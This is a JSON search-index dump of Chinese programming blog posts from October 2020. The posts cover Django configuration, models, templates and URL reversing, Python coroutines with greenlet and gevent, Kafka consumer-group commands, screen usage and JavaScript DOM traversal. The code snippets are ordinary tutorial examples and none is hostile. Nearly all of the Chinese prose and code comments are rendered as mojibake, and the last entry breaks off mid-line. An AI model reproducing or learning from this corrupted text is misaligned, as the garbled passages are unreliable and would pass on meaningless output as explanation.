ä¿®æ”¹__init__.py(settings.pyåŒçº§ç›®å½•ä¸‹) import pymysql pymysql.install_as_MySQLdb() pymysql.version_info = (1, 4, 13, \"final\", 0) ","date":"2020-10-12 16:54","objectID":"/post/2028/:0:0","tags":["python","django"],"title":"django3.1ä½¿ç”¨pymysqlæŠ¥é”™  mysqlclient 1.4.0 or newer is required; you have 0.10.1.","uri":"/post/2028/"},{"categories":["python"],"content":" é…ç½®åº”ç”¨ä¸‹çš„admin.py from django.contrib import admin from booktest.models import BookInfo, HeroInfo class BookInfoAdmin(admin.ModelAdmin): \"\"\"å›¾ä¹¦æ¨¡å‹ç®¡ç†ç±»\"\"\" # è‡ªå®šä¹‰æ˜¾ç¤ºå“ªäº›å­—æ®µ list_display = ['id', 'btitle', 'bpub_date'] class HeroInfoAdmin(admin.ModelAdmin): \"\"\"äººç‰©æ¨¡å‹ç®¡ç†ç±»\"\"\" # è‡ªå®šä¹‰æ˜¾ç¤ºå“ªäº›å­—æ®µ list_display = ['id', 'hname', 'hgender', 'hcomment', 'hbook_id', 'hbook'] # æ³¨å†Œæ¨¡å‹ç±»,åªæœ‰æ³¨å†Œçš„æ¨¡å‹ç±»æ‰ä¼šæ˜¾ç¤ºåœ¨åå°ç®¡ç†ä¸­ admin.site.register(BookInfo, BookInfoAdmin) admin.site.register(HeroInfo, HeroInfoAdmin) 2.å°† xxx objectæ˜¾ç¤ºä¸ºè‡ªå®šä¹‰å†…å®¹ 43487-af42efuk2m9.png åœ¨models.pyä¸­ä¿®æ”¹ä¸ªæ¨¡å‹ç±»æ·»åŠ __str__æ–¹æ³• def __str__(self): return self.btitle ","date":"2020-10-12 12:56","objectID":"/post/2026/:0:0","tags":["python","django"],"title":"django-åå°å­—æ®µæ˜¾ç¤ºé…ç½®","uri":"/post/2026/"},{"categories":["python"],"content":"å®šä¹‰ 1.å®šä¹‰æ¨¡å‹ç±»ï¼š from django.db import models # Create your models here. # å®šä¹‰ä¸€ä¸ªæ¨¡å‹ç±»,è¡¨åBookInfo,ç»§æ‰¿models.Model class BookInfo(models.Model): # # idå­—æ®µ,ä¸å†™ä¹Ÿå¯ä»¥ï¼Œé»˜è®¤å°±ä¼šæœ‰idå­—æ®µ # id = models.AutoField(primary_key=True) # å›¾ä¹¦åç§°å­—æ®µã€‚å­—ç¬¦æ•°æ®ç±»å‹å­—æ®µ btitle = models.CharField(max_length=20, null=False) # å›¾ä¹¦å‡ºç‰ˆæ—¥æœŸå­—æ®µã€‚ bpub_date = models.DateField() # å®šä¹‰ä¸€ä¸ªäººç‰©æ¨¡å‹ç±»,ä¸å›¾ä¹¦ç±»æ˜¯ä¸€å¯¹å¤šçš„å…³ç³» class HeroInfo(models.Model): # äººç‰©å§“å hname = models.CharField(max_length=20) # äººç‰©æ€§åˆ« hgender = models.BooleanField(default=False) # å¤‡æ³¨ hcomment = models.CharField(max_length=100) # ä¸€æœ¬ä¹¦å¯¹åº”å¤šä¸ªäººç‰©,åœ¨äººç‰©è¿™è¾¹åŠ å¤–é”®ã€‚å…³è”BookInfoè¡¨çš„idå­—æ®µ hbook = models.ForeignKey('BookInfo', on_delete=models.SET_NULL, null=True, to_field=\"id\") on_deleteå‚æ•°ï¼š çº§è”åˆ é™¤ï¼šmodels.CASCADE å½“å…³è”è¡¨ä¸­çš„æ•°æ®åˆ é™¤æ—¶ï¼Œè¯¥å¤–é”®ä¹Ÿåˆ é™¤ ç½®ç©ºï¼šmodels.SET_NULL å½“å…³è”è¡¨ä¸­çš„æ•°æ®åˆ é™¤æ—¶ï¼Œè¯¥å¤–é”®ç½®ç©ºï¼Œå½“ç„¶ï¼Œä½ çš„è¿™ä¸ªå¤–é”®å­—æ®µå¾—å…è®¸ä¸ºç©ºï¼Œnull=True è®¾ç½®é»˜è®¤å€¼ï¼šmodels.SET_DEFAULT åˆ é™¤çš„æ—¶å€™ï¼Œå¤–é”®å­—æ®µè®¾ç½®ä¸ºé»˜è®¤å€¼ï¼Œæ‰€ä»¥å®šä¹‰å¤–é”®çš„æ—¶å€™æ³¨æ„åŠ ä¸Šä¸€ä¸ªé»˜è®¤å€¼ã€‚ to_fieldå‚æ•°ï¼š è‡ªå®šä¹‰å…³è”è¡¨çš„id 2.ç”Ÿæˆè¿ç§»è„šæœ¬ # å°†æ¨¡å‹ç±»ç”Ÿæˆdjangoè¯†åˆ«çš„è¿ç§»è„šæœ¬ python manage.py makemigrations 3.ç”Ÿæˆè¡¨ # æ ¹æ®è¿ç§»è„šæœ¬ç”Ÿæˆè¡¨ python manage.py migrate æ¯æ¬¡ä¿®æ”¹æ¨¡å‹ç±»,éœ€è¦é‡æ–°ç”Ÿæˆè¿ç§»è„šæœ¬,ç„¶åå†ç”Ÿæˆè¡¨ ","date":"2020-10-12 09:25","objectID":"/post/2024/:1:0","tags":["python","django"],"title":"django-æ¨¡å‹ç±»,åŸºæœ¬æ“ä½œ","uri":"/post/2024/"},{"categories":["python"],"content":"æ“ä½œ è¿›å…¥django shell python manage.py shell \u003e\u003e\u003e from booktest.models import BookInfo # è‡ªå·±å®ä¾‹åŒ–ä¸€ä¸ªä¹¦å¯¹è±¡,ç„¶åæ’å…¥æ•°æ® \u003e\u003e\u003e b = BookInfo() \u003e\u003e\u003e b.btitle = 'å¤©é¾™å…«éƒ¨' \u003e\u003e\u003e from datetime import date \u003e\u003e\u003e b.bpub_date = date(1990,1,1) \u003e\u003e\u003e b.save() # è·å–è¡¨ä¸­æ‰€æœ‰æ•°æ® b1 = BookInfo.objects.all() b1[0].btitle # é€šè¿‡æ¡ä»¶æŸ¥æ‰¾,æŸ¥æ‰¾çš„è®°å½•å¿…é¡»æ˜¯å”¯ä¸€çš„ã€‚è¿”å›ä¸€ä¸ªå¯¹è±¡ b2 = BookInfo.objects.get(id=1) # ä½¿ç”¨è¿™ä¸ªå¯¹è±¡å¯ä»¥è¿›è¡Œè¯»å–ã€ä¿®æ”¹ã€åˆ é™¤ç­‰æ“ä½œ b2.btitle b2.delete() ** é€šè¿‡äººç‰©è·å–ä¹¦å ** # äººç‰©å¯¹è±¡,æ’å…¥æ•°æ® \u003e\u003e\u003e h1 = HeroInfo() \u003e\u003e\u003e h1.hname = 'è™šç«¹' \u003e\u003e\u003e h1.hgender = False \u003e\u003e\u003e h1.hcomment = 'å’Œå°š' \u003e\u003e\u003e h1.hbook_id = 1 \u003e\u003e\u003e h1.save() # é€šè¿‡æ¡ä»¶æŸ¥æ‰¾,æŸ¥æ‰¾çš„è®°å½•å¿…é¡»æ˜¯å”¯ä¸€çš„ã€‚è¿”å›ä¸€ä¸ªå¯¹è±¡ h2 = HeroInfo.objects.get(id=1) # ä½¿ç”¨è¿™ä¸ªå¯¹è±¡å¯ä»¥è¿›è¡Œè¯»å–ã€ä¿®æ”¹ã€åˆ é™¤ç­‰æ“ä½œ h2.hname # è·å–å¤–é”®id h2.hbook_id # å½“å‰äººç‰©å…³è”çš„è¡¨çš„è®°å½•(è¿”å›å¯¹è±¡) h2.hbook # è·å–äººç‰©å¯¹åº”çš„ä¹¦å h2.hbook.btitle ** é€šè¿‡ä¹¦åè·å–äººç‰©ä¿¡æ¯ ** b = BookInfo.objects.get(id=1) # è¿”å›å…³è”çš„æ‰€æœ‰äººç‰©å¯¹è±¡ b.heroinfo_set.all() ","date":"2020-10-12 09:25","objectID":"/post/2024/:2:0","tags":["python","django"],"title":"django-æ¨¡å‹ç±»,åŸºæœ¬æ“ä½œ","uri":"/post/2024/"},{"categories":["python"],"content":"ä¸²è¡Œæ‰§è¡Œç¨‹åº import time import random def producer(): res = [] for i in range(9999990): res.append(i) return res def consumer(c): x = 0 for i in c: x += i return x start = time.time() res = producer() print(consumer(res)) print(time.time() - start) ","date":"2020-10-12 08:37","objectID":"/post/2023/:1:0","tags":["python"],"title":"python-åç¨‹","uri":"/post/2023/"},{"categories":["python"],"content":"yieldå¹¶å‘æ‰§è¡Œç¨‹åº def producer(g): res = \"\" for i in range(9999990): res = g.send(i) return res def consumer(): num = 0 while True: x = yield num # xæ˜¯sendå‘é€æ¥çš„å€¼ num += x start = time.time() c1 = consumer() next(c1) print(producer(c1)) print(time.time() - start) ä¸Šé¢çš„ä¸¤ç§æ–¹å¼æ‰§è¡Œç»“æœæ˜¯ä¸²è¡Œæ¯”è¾ƒå¿« å› ä¸ºä¸‹é¢çš„å¹¶å‘æ‰§è¡Œä¸­æ²¡æœ‰é‡åˆ°IO,åœ¨ä¸¤ä¸ªå‡½æ•°ä¹‹é—´äº¤æ›¿è¿è¡Œ,cpué¢‘ç¹è¿›è¡Œä¸Šä¸‹æ–‡åˆ‡æ¢ï¼Œåè€Œä¼šé™ä½é€Ÿåº¦ ä¸Šé¢çš„ä¸²è¡Œä¸­åªåˆ‡æ¢ä¸€æ¬¡,æ‰€ä»¥ä¸Šé¢çš„ä¸²è¡Œæ¯”å¹¶å‘å¿«åœ¨ä¸Šä¸‹æ–‡åˆ‡æ¢ä¸Šäº†ã€‚ è™½ç„¶ä¸Šé¢ç”¨äº†å¤šä»»åŠ¡äº¤æ›¿è¿è¡Œï¼Œä½†æ˜¯æ²¡æœ‰é‡åˆ°IOå…¶å®æ˜¯æ²¡å¿…è¦åˆ‡æ¢çš„. ä½†æ˜¯ç›®å‰åªæ˜¯ä½¿ç”¨yieldçš„è¯ï¼Œå¹¶ä¸èƒ½ è¯†åˆ«åˆ°æœ‰IOæ“ä½œ å†åšåˆ‡æ¢æ“ä½œ ","date":"2020-10-12 08:37","objectID":"/post/2023/:2:0","tags":["python"],"title":"python-åç¨‹","uri":"/post/2023/"},{"categories":["python"],"content":"ä½¿ç”¨greenletæ¨¡å—,å¯ä»¥ç®€åŒ–å‡½æ•°é—´åˆ‡æ¢çš„æ“ä½œï¼Œä½†ä¹Ÿä¸èƒ½è§£å†³IOé—®é¢˜ from greenlet import greenlet def test1(): print(12) gr2.switch() # åˆ‡æ¢åˆ°gr2 print(34) def test2(): print(56) gr1.switch() # åˆ‡æ¢åˆ°gr1 print(78) gr1 = greenlet(test1) gr2 = greenlet(test2) gr1.switch() # æ‰§è¡Œè¿‡ç¨‹ test1[print(12)] --\u003e test2[print(56)] --\u003e test1[print(34)] ç¨‹åºç»“æŸ # ä¸‹é¢çš„æ‰§è¡Œæ•ˆç‡æ¯”yieldè¦æ…¢å¾ˆå¤šï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆ X = 0 NUM = 0 def producer(area): global X for i in range(area): # 9999990 X = i g2.switch() def consumer(): global NUM while True: NUM += X g1.switch() # ä¸å¯ä»¥ä¼ å‡½æ•°å‚æ•° g1 = greenlet(producer) g2 = greenlet(consumer) start = time.time() # åˆ‡æ¢åˆ°g1è¿è¡Œ,å¯ä»¥ä¼ å‚ g1.switch(9999990) print(NUM) print(time.time() - start) ","date":"2020-10-12 08:37","objectID":"/post/2023/:3:0","tags":["python"],"title":"python-åç¨‹","uri":"/post/2023/"},{"categories":["python"],"content":"Geventæ¨¡å— import gevent from gevent import monkey # é»˜è®¤ä¸æ”¯æŒé˜»å¡å…¶ä»–IOæ“ä½œ[é»˜è®¤æ”¯æŒgevent.sleep(3)],è¦æ”¯æŒå…¶ä»–IOæ“ä½œéœ€è¦æ‰“è¡¥ä¸ã€‚ monkey.patch_all() def eat(name): print(\"%s eat 1 \" % name) # gevent.sleep(3) time.sleep(2) print(\"%s eat 2 \" % name) def play(name): print(\"%s play 1 \" % name) time.sleep(3) print(\"%s play 2 \" % name) # åˆ›å»ºåç¨‹ä»»åŠ¡ï¼Œgeventé‡åˆ°é˜»å¡å°±ä¼šåˆ‡æ¢æ‰§è¡Œåç¨‹ä»»åŠ¡ g1 = gevent.spawn(eat, \"soulchild\") g2 = gevent.spawn(play, \"soulchild\") print(\"ok\") for i in range(5): print(i) # æ¨¡æ‹ŸIOé˜»å¡,è¿™æ—¶g1å’Œg2ä¼šè¢«è°ƒç”¨ time.sleep(0.1) # æ¨¡æ‹ŸIOé˜»å¡,è¿™æ—¶g1å’Œg2ä¼šè¢«è°ƒç”¨ gevent.joinall([g1, g2]) ","date":"2020-10-12 08:37","objectID":"/post/2023/:4:0","tags":["python"],"title":"python-åç¨‹","uri":"/post/2023/"},{"categories":["python"],"content":"settings.pyé…ç½®ä¸‰ä¸ªéƒ¨åˆ† # æ·»åŠ å†…ç½®æ ‡ç­¾é…ç½® TEMPLATES = [ { ...... 'OPTIONS': { ...... 'builtins': ['django.templatetags.static'] }, }, ] # é…ç½®é™æ€æ–‡ä»¶urlè·¯å¾„ STATIC_URL = '/static/' # é…ç½®é™æ€æ–‡ä»¶è·¯å¾„ STATICFILES_DIRS = [ os.path.join(BASE_DIR, \"static\") ] é…ç½®å®Œæˆåå°±å¯ä»¥åœ¨æ¨¡æ¿ä¸­ç›´æ¥ä½¿ç”¨äº† \u003cscript src=\"{% static \"js/jquery.js\" %}\" \u003e\u003c/script\u003e ","date":"2020-10-11 19:58","objectID":"/post/2022/:0:0","tags":["python","django"],"title":"django-é™æ€æ–‡ä»¶é…ç½®","uri":"/post/2022/"},{"categories":["python"],"content":"é»˜è®¤htmlè½¬ä¹‰æ˜¯å¼€å¯çš„ï¼Œæ¯”å¦‚\u003ch1\u003eok\u003ch1\u003eä¼šè¢«è½¬æˆ\u0026lt;h1\u0026gt;ok\u0026lt;/h1\u0026gt;ã€‚åœ¨ç½‘é¡µä¸­æ‰€è§å³æ‰€å¾— {â€œcontentâ€: â€œokâ€} 1.è¿‡æ»¤å™¨å…³é—­è½¬ä¹‰ {{ content | safe }} {# åœ¨ç½‘é¡µä¸­æ˜¾ç¤ºçš„æ˜¯h1æ ‡é¢˜ #} 2.æ ‡ç­¾å…³é—­è½¬ä¹‰ {% autoescape off %} {{ content }} {# åœ¨ç½‘é¡µä¸­æ˜¾ç¤ºçš„æ˜¯h1æ ‡é¢˜ #} {% endautoescape %} ","date":"2020-10-10 18:19","objectID":"/post/2019/:0:0","tags":["python","django"],"title":"django-æ¨¡æ¿å…³é—­htmlè½¬ä¹‰","uri":"/post/2019/"},{"categories":["python"],"content":"çˆ¶æ¨¡ç‰ˆ \u003c!DOCTYPE html\u003e \u003chtml lang=\"en\"\u003e \u003chead\u003e \u003cmeta charset=\"UTF-8\"\u003e \u003ctitle\u003e{% block title %} é»˜è®¤ {% endblock %}\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003ch1\u003eheader\u003c/h1\u003e {% block b1 %} \u003cp\u003eæ¨¡æ¿ç»§æ‰¿ï¼Œæˆ‘æ˜¯é»˜è®¤å†…å®¹ï¼Œå¯ä»¥è¢«ä¿®æ”¹\u003c/p\u003e {% endblock b1 %} \u003ch1\u003efooter\u003c/h1\u003e \u003c/body\u003e \u003c/html\u003e å­æ¨¡æ¿ {% extends 'tpl/index.html' %} {% block title %} æ–°çš„æ ‡é¢˜ {% endblock %} {% block b1 %} {{ block.super }} {# è·å–æ¨¡ç‰ˆé»˜è®¤çš„å†…å®¹ #} \u003cp\u003eæ›¿æ¢çˆ¶æ¨¡æ¿çš„å†…å®¹\u003c/p\u003e {% endblock %} ","date":"2020-10-10 18:03","objectID":"/post/2018/:0:0","tags":["python","django"],"title":"django-æ¨¡æ¿ç»§æ‰¿","uri":"/post/2018/"},{"categories":["python"],"content":"1.å˜é‡ æ™®é€šå˜é‡: x = 'ok' {{ x }} å­—å…¸:d1 = {\"name\": \"zs\"} {{ d1.name }} åˆ—è¡¨: l1 = [0,1,2,3,4] {{ l1.0 }} ","date":"2020-10-10 15:13","objectID":"/post/2015/:1:0","tags":["python","django"],"title":"django-æ¨¡æ¿åŸºæœ¬æ“ä½œ","uri":"/post/2015/"},{"categories":["python"],"content":"2.ifåˆ¤æ–­ \u003c!-- ä¹Ÿå¯ä»¥if in xxx--\u003e {% if score \u003c 60 %} \u003cp\u003eæˆç»©ä¸åŠæ ¼\u003c/p\u003e {% elif score == 60 %} \u003cp\u003eåˆšåˆšåŠæ ¼\u003c/p\u003e {% else %} \u003cp\u003eæˆç»©åŠæ ¼\u003c/p\u003e {% endif %} ","date":"2020-10-10 15:13","objectID":"/post/2015/:2:0","tags":["python","django"],"title":"django-æ¨¡æ¿åŸºæœ¬æ“ä½œ","uri":"/post/2015/"},{"categories":["python"],"content":"3.forå¾ªç¯ \u003cul\u003e {% for i in l1 %} \u003cli\u003e{{ i }}\u003c/li\u003e {% endfor %} \u003c/ul\u003e \u003c!-- åå‘éå† --\u003e \u003cul\u003e {% for i in l1 reversed %} \u003cli\u003e{{ i }}\u003c/li\u003e {% endfor %} \u003c/ul\u003e \u003c!-- empty --\u003e \u003cul\u003e {% for i in l1 %} \u003cli\u003e{{ i }}\u003c/li\u003e {% empty %} \u003cli\u003el1æ²¡æœ‰å†…å®¹\u003c/li\u003e {% endfor %} \u003c/ul\u003e {{ forloop.counter }}:å½“å‰å¾ªç¯çš„è®¡æ•°ï¼Œä»1å¼€å§‹ {{ forloop.counter0 }}:å½“å‰å¾ªç¯çš„è®¡æ•°ï¼Œä»0å¼€å§‹ {{ forloop.revcounter }}:å€’åºçš„å¾ªç¯è®¡æ•°,åˆ°1ç»“æŸ {{ forloop.revcounter0 }}:å€’åºçš„å¾ªç¯è®¡æ•°,åˆ°0ç»“æŸ {{ forloop.first }}: å¸ƒå°”å€¼,æ˜¯å¦ä¸ºç¬¬ä¸€æ¬¡å¾ªç¯ {{ forloop.last }}: å¸ƒå°”å€¼,æ˜¯å¦ä¸ºæœ€åä¸€æ¬¡å¾ªç¯ {{ forloop.parentloop }}: ä¸Šä¸€çº§å¾ªç¯ ","date":"2020-10-10 15:13","objectID":"/post/2015/:3:0","tags":["python","django"],"title":"django-æ¨¡æ¿åŸºæœ¬æ“ä½œ","uri":"/post/2015/"},{"categories":["python"],"content":"4.urlæ ‡ç­¾ https://soulchild.cn/2013.html å…¶ä»–å†…ç½®æ ‡ç­¾:https://docs.djangoproject.com/zh-hans/2.2/ref/templates/builtins/#built-in-tag-reference ","date":"2020-10-10 15:13","objectID":"/post/2015/:4:0","tags":["python","django"],"title":"django-æ¨¡æ¿åŸºæœ¬æ“ä½œ","uri":"/post/2015/"},{"categories":["python"],"content":"5.è¿‡æ»¤å™¨ è¿‡æ»¤å™¨ç†è§£ä¸ºå‡½æ•°,æ–¹ä¾¿ä½¿ç”¨çš„å°åŠŸèƒ½ æ‰€æœ‰å†…ç½®è¿‡æ»¤å™¨ï¼šhttps://docs.djangoproject.com/zh-hans/2.2/ref/templates/builtins/#built-in-filter-reference è‡ªå®šä¹‰è¿‡æ»¤å™¨: https://soulchild.cn/2049.html ","date":"2020-10-10 15:13","objectID":"/post/2015/:5:0","tags":["python","django"],"title":"django-æ¨¡æ¿åŸºæœ¬æ“ä½œ","uri":"/post/2015/"},{"categories":["python"],"content":"5.1 add ç›¸åŠ  {{ 1|add:1 }} \u003c!-- 2 --\u003e {{ l1|add:l2 }} \u003c!-- ä¸¤ä¸ªåˆ—è¡¨åˆå¹¶ --\u003e {{ 1|add:\"a\" }} \u003c!-- ä¸èƒ½åŠ  --\u003e {{ 1|add:\"1\" }} \u003c!-- 2 --\u003e ","date":"2020-10-10 15:13","objectID":"/post/2015/:5:1","tags":["python","django"],"title":"django-æ¨¡æ¿åŸºæœ¬æ“ä½œ","uri":"/post/2015/"},{"categories":["python"],"content":"5.2 cut æ›¿æ¢ \u003c!-- æ›¿æ¢æ‰€æœ‰çš„å†…å®¹ --\u003e {{ \"abc1a2bc3d\"|cut:'a' }} \u003c!-- bc12bc3d --\u003e ","date":"2020-10-10 15:13","objectID":"/post/2015/:5:2","tags":["python","django"],"title":"django-æ¨¡æ¿åŸºæœ¬æ“ä½œ","uri":"/post/2015/"},{"categories":["python"],"content":"5.3 dateæ—¶é—´æ ¼å¼åŒ– https://docs.djangoproject.com/zh-hans/2.2/ref/templates/builtins/#date # è¿”å›ç»™æ¨¡æ¿æ—¶é—´å¯¹è±¡ return render(request, 'index.html', {'today': datetime.now()}) {{ today|date }} \u003c!-- 2020å¹´10æœˆ10æ—¥ --\u003e {{ today|date:'Y-m-d H:i:s' }} \u003c!-- 2020-10-10 11:10:23 --\u003e ","date":"2020-10-10 15:13","objectID":"/post/2015/:5:3","tags":["python","django"],"title":"django-æ¨¡æ¿åŸºæœ¬æ“ä½œ","uri":"/post/2015/"},{"categories":["python"],"content":"app_nameå’Œnamespaceä»‹ç»https://www.liujiangblog.com/course/django/136 ","date":"2020-10-10 11:01","objectID":"/post/2013/:0:0","tags":["python","django"],"title":"django-urlåå‘è§£æ","uri":"/post/2013/"},{"categories":["python"],"content":"1.é…ç½®æ ¹url # æŒ‡å®šåŒ…å«çš„urlä¸ºtpl.urlsï¼Œapp_nameä¸ºtpl,å‘½åç©ºé—´ä¸º\"tpl\" path('', include(('tpl.urls', 'tpl'), namespace=\"tpl\")) # å¦å¤–ä¸€ç§å†™æ³• # æ²¡æœ‰æŒ‡å®šapp_name,éœ€è¦åˆ°App.urlsæ–‡ä»¶ä¸­æ·»åŠ app_name = 'App' path('', include('App.urls', namespace=\"App\")), è·å–å½“å‰çš„app_nameå’Œnamespace request.resolver_match ","date":"2020-10-10 11:01","objectID":"/post/2013/:1:0","tags":["python","django"],"title":"django-urlåå‘è§£æ","uri":"/post/2013/"},{"categories":["python"],"content":"2.é…ç½®å…·ä½“urlçš„name urlpatterns = [ path('login/', views.login, name=\"login\"), path('reverse_url/', views.reverse_url, name=\"reverse_url\"), path('reverse_test/', views.reverse_test, name=\"reverse_test\"), re_path(r'(.*?)/(.*?)/', views.url1, name=\"url1\"), re_path(r'(?P\u003carg1\u003e.*?)/(?P\u003carg2\u003e.*?)/', views.url1, name=\"url2\"), ] ","date":"2020-10-10 11:01","objectID":"/post/2013/:2:0","tags":["python","django"],"title":"django-urlåå‘è§£æ","uri":"/post/2013/"},{"categories":["python"],"content":"2.æ¨¡æ¿è¯­æ³• å†™æ­»çš„ \u003ca href=\"/login/\"\u003eæ™®é€šurl,å†™æ­»\u003c/a\u003e æ¨¡æ¿è¯­æ³• \u003c!-- tplæ˜¯namespace,loginæ˜¯urlçš„åç§°ï¼Œä¸Šé¢nameå®šä¹‰çš„ --\u003e \u003ca href=\"{%url 'tpl:login' %}\"\u003eæ ¹æ®namespaceè·å–\u003c/a\u003e å¸¦å‚æ•°çš„ # ä½ç½®å‚æ•° \u003ca href=\"{%url 'tpl:login' 'å‚æ•°1' 'å‚æ•°2' %}\"\u003eæ ¹æ®namespaceè·å–\u003c/a\u003e # å‘½åå‚æ•° \u003ca href=\"{%url 'tpl:url2' arg1='soulchild' arg2=12 %}\"\u003eæ ¹æ®namespaceè·å–çš„,å‘½åå‚æ•°url: {%url 'tpl:url2' arg1='soulchild' arg2=12 %}\u003c/a\u003e ","date":"2020-10-10 11:01","objectID":"/post/2013/:3:0","tags":["python","django"],"title":"django-urlåå‘è§£æ","uri":"/post/2013/"},{"categories":["python"],"content":"3.pythonä¸­reverseåå‘è·å–url ä¸å¸¦å‚æ•° def reverse_test(request): print(reverse(\"tpl:login\")) return HttpResponse(\"python reverse\") ä½ç½®å‚æ•° def reverse_test(request): print(reverse(\"tpl:url1\", args=('arg1', 'arg2'))) return HttpResponse(\"python reverse\") å‘½åå‚æ•° def reverse_test(request): print(reverse(\"tpl:url2\", kwargs={'arg1': '1', 'arg2': '2'})) return HttpResponse(\"python reverse\") ","date":"2020-10-10 11:01","objectID":"/post/2013/:4:0","tags":["python","django"],"title":"django-urlåå‘è§£æ","uri":"/post/2013/"},{"categories":["python"],"content":"1.å®‰è£…pymysql pip install pymysql 2.ä¿®æ”¹settings.py DATABASES = { 'default': { 'ENGINE': 'django.db.backends.mysql', 'NAME': 'django_test', 'USER': 'root', 'PASSWORD': '123456', 'HOST': 'localhost', 'PORT': '3306', } } æ›´å¤šå‚æ•°: https://docs.djangoproject.com/zh-hans/2.2/ref/settings/#engine 3.ä¿®æ”¹é¡¹ç›®çš„__init__.py(å’Œsettings.pyåŒçº§ç›®å½•) from pymysql import install_as_MySQLdb install_as_MySQLdb() ","date":"2020-10-09 19:11","objectID":"/post/2012/:0:0","tags":["python"],"title":"django-é…ç½®mysql","uri":"/post/2012/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"åˆ—å‡ºæ¶ˆè´¹è€…ç»„ ./kafka-consumer-groups.sh --bootstrap-server ip:9092,ip:9092,ip:9092 --list æ¶ˆè´¹ç»„è¯¦ç»†ä¿¡æ¯ ./kafka-consumer-groups.sh --bootstrap-server {kafkaè¿æ¥åœ°å€} --describe --group {æ¶ˆè´¹ç»„} åˆ é™¤æ¶ˆè´¹è€…ç»„ ./kafka-consumer-groups.sh --bootstrap-server ip:9092,ip:9092,ip:9092 --delete --group bbbb ","date":"2020-10-07 17:22","objectID":"/post/2772/:0:0","tags":["kafka"],"title":"kafkaæ“ä½œåˆ é™¤æ¶ˆè´¹è€…ç»„","uri":"/post/2772/"},{"categories":["åŸºç¡€å†…å®¹"],"content":" # åˆ›å»ºæ–°ä¼šè¯çª—å£ screen # åˆ›å»ºæ–°ä¼šè¯çª—å£-å¸¦åç§° screen -S s1 # ç¦»å¼€ä¼šè¯çª—å£ Ctrl + a, d # æŸ¥çœ‹æ‰€æœ‰ä¼šè¯çª—å£ screen -ls # è¿›å…¥å·²å­˜åœ¨çš„ä¼šè¯çª—å£ screen -r (id or name) # æ–­å¼€æŒ‡å®šçš„ä¼šè¯çª—å£ screen -d (id or name) # æ€æ‰å½“å‰ä¼šè¯çª—å£(æ€æ‰ä¼šè¯çª—å£,çª—å£å°†ä¸å­˜åœ¨) Ctrl + a, k æˆ– é€€å‡ºç»ˆç«¯Ctrl + d ","date":"2020-10-07 16:53","objectID":"/post/2771/:0:0","tags":["linux"],"title":"Screenå¸¸ç”¨å‘½ä»¤","uri":"/post/2771/"},{"categories":["å…¶ä»–"],"content":" \u003c!DOCTYPE html\u003e \u003chtml lang=\"en\"\u003e \u003chead\u003e \u003cmeta charset=\"UTF-8\"\u003e \u003cmeta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"\u003e \u003ctitle\u003eDocument\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003cdiv class=\"parent\"\u003e \u003cdiv class=\"son\"\u003e\u003c/div\u003e \u003c/div\u003e \u003cspan\u003ebrother\u003c/span\u003e \u003cul\u003e \u003cli\u003eaaa\u003c/li\u003e \u003c/ul\u003e \u003cbutton\u003eåˆ é™¤ç¬¬ä¸€ä¸ªlièŠ‚ç‚¹\u003c/button\u003e \u003cscript\u003e // å…ƒç´ èŠ‚ç‚¹ nodeTypeä¸º1 // å±æ€§èŠ‚ç‚¹ nodeTypeä¸º2 // æ–‡æœ¬èŠ‚ç‚¹ nodeTypeä¸º3 var par = document.querySelector(\".parent\"); ///////////////////////////////è·å–å­èŠ‚ç‚¹å’Œå…ƒç´ ////////////////////////////// //è·å–æ‰€æœ‰å­èŠ‚ç‚¹ console.log(\"æ‰€æœ‰å­èŠ‚ç‚¹:\",par.childNodes); // divæœ‰ä¸‰ä¸ªå­èŠ‚ç‚¹ï¼Œåˆ†åˆ«æ˜¯\"æ¢è¡Œç¬¦\"ã€\"div .son\"ã€\"æ¢è¡Œç¬¦\" // è·å–ç¬¬ä¸€ä¸ªå’Œæœ€åä¸€ä¸ªå­èŠ‚ç‚¹ console.log(\"ç¬¬ä¸€ä¸ªå­èŠ‚ç‚¹:\",par.firstChild); console.log(\"æœ€åä¸€ä¸ªå­èŠ‚ç‚¹:\",par.lastChild); // è·å–æ‰€æœ‰å­å…ƒç´  console.log(\"æ‰€æœ‰å­å…ƒç´ :\",par.children); // è·å–ç¬¬ä¸€ä¸ªå’Œæœ€åä¸€ä¸ªå­å…ƒç´  console.log(\"ç¬¬ä¸€ä¸ªå­å…ƒç´ :\",par.firstElementChild); console.log(\"æœ€åä¸€ä¸ªå­å…ƒç´ :\",par.lastElementChild); //////////////////////////////è·å–å…„å¼ŸèŠ‚ç‚¹å’Œå…ƒç´ ////////////////////////////// //è·å–ä¸Šä¸€ä¸ªå’Œä¸‹ä¸€ä¸ªå…„å¼ŸèŠ‚ç‚¹ console.log(\"ä¸‹ä¸€ä¸ªå…„å¼ŸèŠ‚ç‚¹:\",par.nextSibling); console.log(\"ä¸Šä¸€ä¸ªå…„å¼ŸèŠ‚ç‚¹:\",par.previousSibling); //è·å–ä¸Šä¸€ä¸ªå’Œä¸‹ä¸€ä¸ªå…„å¼Ÿå…ƒç´  console.log(\"ä¸‹ä¸€ä¸ªå…„å¼Ÿå…ƒç´ :\",par.nextElementSibling); // ä¸‹ä¸€ä¸ªå…„å¼ŸèŠ‚ç‚¹æ˜¯span console.log(\"ä¸Šä¸€ä¸ªå…„å¼Ÿå…ƒç´ :\",par.previousElementSibling); // ä¸Šä¸€ä¸ªå…„å¼ŸèŠ‚ç‚¹æ˜¯null //////////////////////////////è·å–çˆ¶å¼ŸèŠ‚ç‚¹å’Œå…ƒç´ ////////////////////////////// console.log(\"çˆ¶èŠ‚ç‚¹:\",par.parentNode); console.log(\"çˆ¶å…ƒç´ :\",par.parentElement); //////////////////////////////åˆ›å»ºå…ƒç´ èŠ‚ç‚¹////////////////////////////// // çˆ¶å…ƒç´ ä¸­è¿½åŠ ä¸€ä¸ªæ–°çš„å…ƒç´  // å…ˆè·å–çˆ¶çº§æ ‡ç­¾ var ul = document.querySelector(\"ul\") // åˆ›å»ºä¸€ä¸ªæ–°çš„å…ƒç´  var li = document.createElement(\"li\") // å¡«å†™å†…å®¹å’Œè¿½åŠ  li.innerHTML=\"æˆ‘æ˜¯è¿½åŠ çš„\" ul.appendChild(li) // åœ¨æŸä¸ªå…ƒç´ çš„å‰é¢æ’å…¥ //è·å–åœ¨è°å‰é¢æ’å…¥ // var aaa = 